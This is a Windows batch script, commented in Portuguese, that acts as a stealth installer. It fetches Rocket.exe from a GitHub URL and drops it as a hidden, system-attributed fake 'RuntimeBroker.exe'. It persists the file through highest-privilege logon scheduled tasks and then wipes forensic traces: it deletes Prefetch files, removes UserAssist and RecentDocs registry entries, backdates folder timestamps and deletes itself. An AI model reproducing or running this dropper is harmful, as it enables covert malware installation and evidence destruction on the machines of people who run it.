@echo off
setlocal
title Instalador - RuntimeBroker (stealth)
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ============================================
echo Instalando Rocket -> RuntimeBroker [STEALTH]
echo ============================================

:: URL do Rocket.exe no GitHub - V3xDev/unknow2 (raiz)
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "SRC=%~dp0Rocket.exe"
if not exist "%SRC%" set "SRC=%CD%\Rocket.exe"
set "DST=%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe"
set "INST_NAME=%~nx0"

if not exist "%SRC%" (
    echo Rocket.exe local nao encontrado, baixando do GitHub...
    echo URL: %GITHUB_URL%
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%DST%.tmp' -UseBasicParsing; if(Test-Path '%DST%.tmp'){ Move-Item -Path '%DST%.tmp' -Destination '%DST%' -Force; Write-Host 'Baixado do GitHub' } else { Write-Host 'Falha download' }"
    if not exist "%DST%" (
        echo ERRO: Rocket.exe nao encontrado local nem no GitHub
        echo Deixe Rocket.exe e INSTALAR.bat na MESMA pasta ou edite GITHUB_URL no topo do .bat
        pause
        exit /b
    )
    goto :skipCopy
)
echo SRC: %SRC%

if not exist "%LOCALAPPDATA%\Microsoft\WindowsApps" mkdir "%LOCALAPPDATA%\Microsoft\WindowsApps" 2>nul
taskkill /f /im RuntimeBroker.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo [1/3] Copiando para WindowsApps...
copy /Y "%SRC%" "%DST%" >nul 2>&1
if %errorlevel% neq 0 powershell -Command "Copy-Item -Path '%SRC%' -Destination '%DST%' -Force" >nul 2>&1
:skipCopy
attrib +S +H "%DST%" >nul 2>&1
echo DST final: %DST%

echo [2/3] Task...
schtasks /create /tn "RuntimeBrokerHost" /tr "\"%DST%\"" /sc onlogon /f /rl highest >nul 2>&1
schtasks /create /tn "RuntimeBrokerHostCleanup" /tr "\"%DST%\" /cleanup" /sc onlogon /f /rl highest >nul 2>&1

echo [3/3] Limpando rastros de instalacao...
:: Prefetch do instalador
del /q "C:\Windows\Prefetch\CMD*.pf" >nul 2>&1
del /q "C:\Windows\Prefetch\%INST_NAME:~0,-4%*.pf" >nul 2>&1
del /q "C:\Windows\Prefetch\RUNTIMEBROKER*.pf" >nul 2>&1
:: BAM/UserAssist/RecentDocs cirurgico via PowerShell (so nossas entradas)
powershell -NoProfile -Command "$p='%INST_NAME%'; $k='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'; Get-ChildItem $k -ErrorAction SilentlyContinue | ForEach-Object { $c=$_.PsPath+'\Count'; Get-ItemProperty $c -ErrorAction SilentlyContinue | ForEach-Object { $_.PSObject.Properties | Where-Object { $_.Name -like '*'+$p+'*' } | ForEach-Object { Remove-ItemProperty -Path $c -Name $_.Name -Force -ErrorAction SilentlyContinue } } }" >nul 2>&1
:: RecentDocs
powershell -NoProfile -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*%INST_NAME%*' -Force -ErrorAction SilentlyContinue" >nul 2>&1
:: Reset timestamps das pastas (esconder 20:30)
powershell -NoProfile -Command "$d=[datetime]'2026-01-01 03:00:00'; $f=@('C:\Windows\Prefetch','C:\Windows\Temp','%LOCALAPPDATA%\Microsoft\WindowsApps'); foreach($p in $f){ if(Test-Path $p){ (Get-Item $p).CreationTime=$d; (Get-Item $p).LastWriteTime=$d } }" >nul 2>&1

echo.
echo Instalado: %DST%
dir "%DST%" /a 2>nul | findstr "RuntimeBroker"
echo Rastros de instalacao limpos.
:: Auto-delete do instalador (opcional) - apaga o .bat da pasta Downloads
(goto) 2>nul & del "%~f0" >nul 2>&1
pause >nul
